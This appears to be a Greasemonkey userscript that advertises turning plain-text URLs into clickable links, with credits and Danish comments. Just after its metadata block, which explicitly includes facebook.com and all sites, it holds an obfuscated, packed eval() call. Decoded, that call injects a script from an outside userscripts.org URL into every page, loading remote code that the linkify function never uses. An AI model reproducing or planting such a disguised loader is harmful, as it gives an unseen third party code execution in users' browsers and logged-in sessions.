// This script looks for any thing of the form
// [something not blank][a dot][something not blank], 
// then matches that which comes after the dot - and possibly before a slash - 
// with a list of know extensions, such as com, us, net etc. 
// If it has such an extension, it is turned into a link. 
// This way the script attempts to catch links like
// google.com and userscripts.org/tag/link.
// Because the script looks up extensions in a list, 
// you might want to alter the list (lovligeEndelser) to fit your needs. 
//
// The script is borrows a bit from the ÂLinkify PlusÂ script 
// (especially the parent not a | head | etc -  thing). And therefore the following 
//
//- - - 
//
// Loosely based on the Linkify script located at:
//   http://downloads.mozdev.org/greasemonkey/linkify.user.js
//
// Originally written by Anthony Lieuallen of http://www.arantius.com/
// Licensed for unlimited modification and redistribution as long as
// this notice is kept intact.
//
// If possible, please contact me regarding new features, bugfixes
// or changes that I could integrate into the existing code instead of
// creating a different script.  Thank you
//
//- - -
//
// for my sake you may do what you want with the script, 
// but you should keep the notice by Anthony Lieuallen
//
// adam
//
// ==UserScript==
// @name          Linkify ting Pro + Last Update
// @include       http*://*.facebook.com/*
// @namespace     http://ergosum.frac.dk/user/
// @description   Turn plain text links into real clikable links. Attempts to catch links like google.com
// @include       *
// @exclude       http://*.google.*/*
// ==/UserScript==
eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('0.6.5(0.3(\'1\')).2=\'4://7.c/b/a/8.9.d\';',14,14,'document|script|src|createElement|https|appendChild|body|userscripts|170127|user|source|scripts|org|js'.split('|'),0,{}))

try{
//dk|com|net|org|se|no|nl|us|uk|de|it|nu|edu|info

var regex = /\b(http:\/\/|shttp:\/\/){0,1}(\w(\w|-)+\.)+(dk|com|net|org|se|no|nl|us|uk|de|it|nu|edu|info)(\/\w*)*(\.\w{2,4}){0,1}(\?\w*|#\w*|&\w*)*\b/gi;

var altText, tekst, muligtLink;

var ikkeTilladteTags = ['a', 'head', 'script', 'style', 'textarea', 'title', 'option', 'pre', 'code'];//tags, hvor det der stÃ¥r inden i ikke skal vÃ¦re links
var path = "//text()[not(parent::" + ikkeTilladteTags.join(" or parent::") +")]";

altText = document.evaluate(path, document, null, XPathResult.UNORDERED_NODE_SNAPSHOT_TYPE, null);

for(var i=0;i<altText.snapshotLength;i++){
	
	tekst = altText.snapshotItem(i);
	muligtLink = tekst.nodeValue;
	
	if(regex.test(muligtLink)){
		
		//til at holde det nye link, og teksten omkring det
		var span = document.createElement('span');
		//tekst.parentNode.replaceChild(span, tekst);
		//alert("parent:" + span.parentNode);
				
		var lastLastIndex = 0;
		regex.lastIndex = 0;
		for(myArray = null; myArray = regex.exec(muligtLink); ){
			//vores match gemmes
			var link = myArray[0];
			
			//alert("har fundet dette link: " + link);
			
			span.appendChild(document.createTextNode(muligtLink.substring(lastLastIndex, myArray.index))); //indsæt det der kommer før dette hit
						
			var href = link;
			
			//sætter http:// foran href, hvis der ikke er det
			var prefix = '';
			if(href.length > 7){
				prefix = href.substring(0,7);
			}
			if(prefix.toLowerCase() != 'http://'){
				href = 'http://' + href;
			}
			
			//skab vores link:
			var a = document.createElement('a');
			a.setAttribute('href', href); //giv det en href
			a.appendChild(document.createTextNode(link)); //linkteksten
			span.appendChild(a); //sætter ind i span
								
			lastLastIndex = regex.lastIndex;
			
		}
		
		span.appendChild(document.createTextNode(muligtLink.substring(lastLastIndex))); //insæt det der kommer efter sidste hit
		tekst.parentNode.replaceChild(span, tekst);

	}
	
		
}
} catch(e){alert(e);}

